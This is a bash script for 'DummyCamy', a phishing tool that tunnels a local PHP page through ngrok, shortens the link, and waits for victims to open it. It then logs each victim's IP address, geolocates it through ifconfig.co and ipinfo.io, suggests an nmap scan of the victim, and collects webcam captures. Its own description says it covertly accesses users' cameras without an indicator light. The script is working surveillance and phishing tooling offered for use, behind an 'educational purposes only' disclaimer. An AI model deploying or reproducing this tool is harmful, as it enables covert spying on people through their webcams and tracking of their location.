#!/bin/bash
# dummycamy v3.0
# Mod by:Amine Boutouil
version="v3.0"
clear

trap 'printf "\n";stop' 2

banner() {

printf "\e[1;92m 
 ____  _   _ __  __ __  ____   __   ____    _    __  ____   __
|  _ \| | | |  \/  |  \/  \ \ / /  / ___|  / \  |  \/  \ \ / /
| | | | | | | |\/| | |\/| |\ V /  | |     / _ \ | |\/| |\ V / 
| |_| | |_| | |  | | |  | | | |   | |___ / ___ \| |  | | | |  
|____/ \___/|_|  |_|_|  |_| |_|    \____/_/   \_\_|  |_| |_|  \e[0m\n
\e[1;33m                         ʙʏ ᴀᴍɪɴᴇ ʙᴏᴜᴛᴏᴜɪʟ          \e[0m\n
"

printf "\e[1;77m For educational purposes only, You and ONLY You are responsible for your actions!! \e[0m"


printf "\n"
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "php is required but not installed. Install it first..."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
country=$(curl -s ifconfig.co/country?ip=$ip)
country_iso=$(curl -s ifconfig.co/country-iso?ip=$ip)
city=$(curl -s ifconfig.co/city?ip=$ip)
isp=$(curl -s ipinfo.io/$ip/org)
region_code=$(curl -s ifconfig.co/json | jq -r '.region_code')
region_name=$(curl -s ifconfig.co/json | jq -r '.region_name')
timezone=$(curl -s ipinfo.io/$ip/timezone)
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Country:\e[0m\e[1;77m %s\e[0m\n" $country
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Country Code:\e[0m\e[1;77m %s\e[0m\n" $country_iso
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] City:\e[0m\e[1;77m %s\e[0m\n" $city
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Region Code:\e[0m\e[1;77m %s\e[0m\n" $region_name
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Region Code:\e[0m\e[1;77m %s\e[0m\n" $region_code
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Timezone:\e[0m\e[1;77m %s\e[0m\n" $timezone
printf "\033[1;31m[\e[0m\e[1;77m *** \e[0m\033[1;31m] To know more use the command : \e[1;37m nmap -A "$ip
cat ip.txt >> saved.ip.txt
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for Data,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Yeeey !! Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Woo Hoo !! Cam file received ;) \e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}



payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https:[^"]*.ngrok.io')
sed 's+forwarding_link+'$link'+g' dummycamy.html > website.html
# sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "unzip is required but not installed. Install it first..."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "wget is required but not installed. Install it first..."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Please Enter Your Ngrok Authtoken:\e[0m\e[1;77m %s\e[0m\n"
read auth_key
./ngrok authtoken $auth_key
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Please Enter Your Ngrok Authtoken:\e[0m\e[1;77m %s\e[0m\n"
read auth_key
./ngrok authtoken $auth_key
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi
printf "\e[0m\033[1;31m ** Remember! Use it with caution ** \e[1;37m\n"
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https:[^"]*.ngrok.io')
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m $link" 
printf "\n" 
#link shortening
printf "\e[1;92m[\e[0m*\e[1;92m] Short link:\e[0m\e[1;77m %s\e[0m $(curl -s -f https://is.gd/create.php?format=simple\&url=$link)"  

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "1) Start the MAGIC\n"
printf "2) About DummyCamy \n"
printf "3) About The Author \n"
printf "4) Quit \n"

read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose an option: \e[0m' option
if [[ $option -eq 1 ]]; then
clear
banner
ngrok_server
elif [[ $option -eq 2 ]]; then
printf "DummyCamy is a Social engineering tool to gain access to user's web camera using Ajax and PHP, many devices does not have a webcam operating led so it can work hidden in the background.\n
Although the newest PCs have a small led next to the camera that works automatically when the cam is being used.\n"
printf "Version : $version\n\n"
printf "Developer : Amine Boutouil\n"
printf "Website : https://blog.boutouil.me/tools/DummyCamy ~ https://github.com/amine-boutouil/dummycamy\n\n"
start1
elif [[ $option -eq 3 ]]; then
printf "This Tool was made by Amine Boutouil, Redirecting to his Portfolio in 2sec...\n\n"
open https://boutouil.me
sleep 2
start1
elif [[ $option -eq 4 ]]; then
printf "Bye Bye! to the next time ^~^"
sleep 1
exit
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
banner
start1
fi

}

banner
dependencies
start1

